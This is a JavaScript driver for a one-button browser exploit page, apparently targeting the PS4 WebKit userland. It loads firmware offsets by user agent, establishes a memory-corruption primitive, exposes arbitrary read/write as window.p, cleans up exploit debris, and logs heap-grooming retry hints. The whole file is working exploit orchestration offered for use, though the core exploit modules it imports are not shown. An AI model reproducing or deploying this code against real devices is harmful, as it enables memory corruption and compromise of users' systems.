/** Single-button arbitrary R/W proof — self-contained GitHub Pages bundle. */
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris, getCoreNative } from "./core.js";
import { runArwProofVerbose } from "./arw_proof.js";

const BUILD = "arw-standalone-1";
const LOG_MAX = 2500;

const params = new URLSearchParams(location.search);
const lines = [];
let busy = false;
let readPrimitivePass = false;

function $(id) { return document.getElementById(id); }

function renderLog() {
    const o = $("out");
    if (!o) return;
    o.textContent = lines.join("\n");
    o.scrollTop = o.scrollHeight;
}

function log(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    try {
        const prev = sessionStorage.getItem("wk-arw-log") || "";
        sessionStorage.setItem("wk-arw-log", (prev ? prev + "\n" : "") + line);
    } catch (_) { }
    renderLog();
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function groomLabel() {
    return params.get("g") || "default";
}

async function runArw() {
    if (busy) return;
    busy = true;
    readPrimitivePass = false;
    lines.length = 0;
    try { sessionStorage.removeItem("wk-arw-log"); } catch (_) { }

    $("btn-arw").disabled = true;
    state("establishing primitive…", "warn");
    log("BOOT", BUILD + "  groom=" + groomLabel());

    const detected = offsetsFor(navigator.userAgent);
    log("UA-FW", (detected.key || "unknown") + (detected.off ? "  offsets loaded" : "  NO OFFSETS"));
    if (detected.off && detected.off.fw_status)
        log("OFFSETS", detected.off.fw_status);

    try {
        log("STEP", "═══ PHASE 1: slopkit-core primitive ═══");
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (tag, detail, attempt) => {
                const prefix = attempt != null ? "[a" + attempt + "] " : "";
                log(prefix + tag, detail || "");
                if (tag === "READ-PRIMITIVE-PASS") readPrimitivePass = true;
            },
        });

        log("STEP", "═══ PHASE 2: install window.p ═══");
        installWindowP(carrier, {
            promote: false,
            onEvent: (t, d) => log(t, d || ""),
        });
        window._wkCarrier = carrier;

        if (!carrier.native) {
            const nat = getCoreNative(carrier);
            if (nat) carrier.native = nat;
        }

        const p = window.p;
        if (!p) throw new Error("window.p missing after installWindowP");

        try { trimExploitDebris(); } catch (e) {
            log("TRIM-WARN", e.message || String(e));
        }

        if (pairStatus.state === "broken")
            throw new Error("pair promotion broken — reload tab");

        log("PRIMITIVE-OK", "window.p live  pair=" + pairStatus.state);

        const off = detected.off;
        if (!off) throw new Error("no firmware offsets for this UA — see ps4_offsets_userland.js");

        log("STEP", "═══ PHASE 3: verbose R/W proof ═══");
        const proof = runArwProofVerbose(p, off, carrier, {
            log,
            readPrimitivePass,
            pairStatus,
        });

        if (proof.ok) {
            state("arbitrary r/w achieved", "ok");
            try {
                sessionStorage.setItem("wk-arw-ok", JSON.stringify({
                    t: Date.now(),
                    fw: detected.key,
                    webkitBase: proof.webkitBase ? String(proof.webkitBase) : "",
                }));
            } catch (_) { }
        } else {
            state("proof incomplete", "bad");
        }
    } catch (e) {
        log("FAIL", e.message || String(e));
        if (/gave up|race|COMPOSITION|PLACEMENT/i.test(String(e.message)))
            log("HINT", "race lost — close browser fully, reload with ?g=drain:96 or ?g=drain:512");
        state("failed", "bad");
    } finally {
        busy = false;
        $("btn-arw").disabled = false;
    }
}

function init() {
    state("ready — tap Arbitrary R/W", "");
    $("btn-arw").addEventListener("click", runArw);
    $("btn-clear").addEventListener("click", () => {
        lines.length = 0;
        try { sessionStorage.removeItem("wk-arw-log"); } catch (_) { }
        renderLog();
        state("log cleared", "");
    });
    try {
        const saved = sessionStorage.getItem("wk-arw-log");
        if (saved) {
            lines.push(...saved.split("\n").slice(-LOG_MAX));
            renderLog();
        }
    } catch (_) { }
    log("READY", "groom=" + groomLabel() + "  — one shot per tab recommended");
}

init();
